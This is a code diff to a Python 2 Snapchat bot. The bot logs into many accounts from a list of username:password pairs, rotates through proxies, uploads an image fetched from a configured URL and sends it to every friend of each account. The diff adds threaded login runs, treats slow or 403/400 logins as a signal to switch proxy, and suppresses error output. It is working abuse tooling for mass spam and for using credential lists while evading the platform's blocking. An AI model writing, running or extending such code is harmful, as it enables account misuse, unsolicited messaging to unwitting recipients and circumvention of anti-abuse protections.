@@ -1,4 +1,4 @@
-import urllib2, urllib, socket, requests, json, threading
+import urllib2, urllib, requests, json, threading, socket
 from snapi import Snapchat
 from datetime import datetime
 
@@ -22,54 +22,37 @@ def main():
         f = open("output.txt", "w")
         f.close()
         prepair()
-        oneThread(inputData)
+        print "threads =", threads
+        if threads == 1:
+            oneThread(inputData)
+        else:
+            authdata = slice_list(inputData, threads)
+            thr = []
+            for i in range(threads):
+                data = authdata[i]
+                thread = threading.Thread(target=oneThread, args=(data, ))
+                thread.start()
+                thr.append(thread)
 
-        '''
-        authdata = slice_list(inputData, threads)
-        thr = []
-        for i in range(threads):
-            data = authdata[i]
-            thread = threading.Thread(target=oneThread, args=(data, ))
-            thread.start()
-
-        for t in thr:
-            t.join()'''
-        
-
-        #print "\nlen = ", len(result)
-        #print "\ntime =", datetime.now() - t
-        #print "\nfull num = ", full
-
-
-def slice_list(input, size):
-    input_size = len(input)
-    slice_size = input_size / size
-    remain = input_size % size
-    result = []
-    iterator = iter(input)
-    for i in range(size):
-        result.append([])
-        for j in range(slice_size):
-            result[i].append(iterator.next())
-        if remain:
-            result[i].append(iterator.next())
-            remain -= 1
-    return result
+            for t in thr:
+                t.join()
 
 
 def oneThread(inp):
     global full
     #print inp
     for proxy in inputProxies:
+        #print "chg prx"
         if not is_bad_proxy(proxy):
             for auth in inp: #inputData:
                 s = auth["user"]+":"+auth["pass"]
+                #print "1a"
                 if s not in result:
                     num = process(proxy, auth)
+                    #print "2a", num
                     fff = open("output.txt", "a")
                     if num == "prox":
-                        break
-                        # bad proxy
+                        break # bad proxy
                     elif num == 0:
                         result[s] = "#error"
                         print s + " #error"
@@ -84,7 +67,9 @@ def oneThread(inp):
         if len(inputData) == len(result):
             print "Ran out of accounts"
             break
-    #print "Ran out of proxies"
+
+    if len(inputData) != len(result):
+        print "Ran out of proxies"
 
 
 # start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
@@ -95,17 +80,19 @@ def process(prox, auth):
     try:
         s = Snapchat()
         s.proxies = prox
-
-        # try login, if 403 - return "rotate proxy"
+        tt = datetime.now()
         login = s.login(auth["user"], auth["pass"])
-        #print "(login)", login
+        dt = (datetime.now()-tt).total_seconds()
+        #print "dt =", dt #, type(dt)
+        if dt > 5:
+            return "prox"
 
         try:
             if login['status'] == 403 or login['status'] == 400:
                 return "prox"
         except:
+            #print "login ok", auth["user"], auth["pass"]
             pass
-        
         
         # upload pic for curr account
         media_id = s.upload(imagename)
@@ -114,8 +101,6 @@ def process(prox, auth):
         recipients = ""
         for friend in login["friends"]:
             recipients += friend["name"] + ","
-            
-
         #print "\nrecipients:", recipients
         try:
             done = s.send(media_id, recipients, time = 10)
@@ -128,11 +113,11 @@ def process(prox, auth):
                 return 0
                 
         except Exception as ex:
-            print "(send) to name", recipients, "-", str(ex)
-            
+            #print "(send) to names" , str(ex)
+            return 0
         return num
     except Exception as ex:
-        print "(main ex)", str(ex)
+        #print "(main ex)", str(ex)
         return 0
 
 
@@ -177,7 +162,6 @@ def prepair():
         exit()
 
     image = ""
-    threads = ""
     try:
         settingsFile = open("settings.txt", "r")
         data = settingsFile.read()
@@ -194,7 +178,9 @@ def prepair():
             if item.find("threads:") != -1:
                 threads = item.replace(" ", "")
         image = image.split("image:")[1]
-        threads = int(threads.split("threads:")[1]) 
+        threads = int(threads.split("threads:")[1])
+        if threads < 1:
+            threads = 1
     except BaseException as ex:
         print "No file named 'settings.txt', error " + str(ex)
         print "\nPress any key to exit"
@@ -205,21 +191,25 @@ def prepair():
     form = form[len(form)-1].split(".")[1]
     imagename = "file." + form
     urllib.urlretrieve(image, filename=imagename)
-    #print "image is ready for upload"
+    print "image is downloaded"
 
 
 def is_bad_proxy(pip):
-    socket.setdefaulttimeout(7)
+    socket.setdefaulttimeout(6)
     try:        
         proxy_handler = urllib2.ProxyHandler({'https': pip})        
         opener = urllib2.build_opener(proxy_handler)
-        opener.addheaders = [('User-agent', 'Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
+        opener.addheaders = [('User-agent', 'Mozilla/5.0')]
+        #Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
         urllib2.install_opener(opener)        
-        req=urllib2.Request('https://google.com')#https://feelinsonice.appspot.com/bq/')
+        req=urllib2.Request('https://www.google.com')
+        #https://feelinsonice.appspot.com/bq/') #
         sock=urllib2.urlopen(req)
-    except urllib2.HTTPError, e:        
+    except urllib2.HTTPError, e:
+        #print "e1", str(e)
         return True 
     except Exception, detail:
+        #print "e2", str(detail)
         return True
     return False
 
@@ -252,6 +242,22 @@ def checkStates():
                 return 0
         except:
             return 0
-    
+
+
+def slice_list(input, size):
+    input_size = len(input)
+    slice_size = input_size / size
+    remain = input_size % size
+    result = []
+    iterator = iter(input)
+    for i in range(size):
+        result.append([])
+        for j in range(slice_size):
+            result[i].append(iterator.next())
+        if remain:
+            result[i].append(iterator.next())
+            remain -= 1
+    return result
+
 
 main()
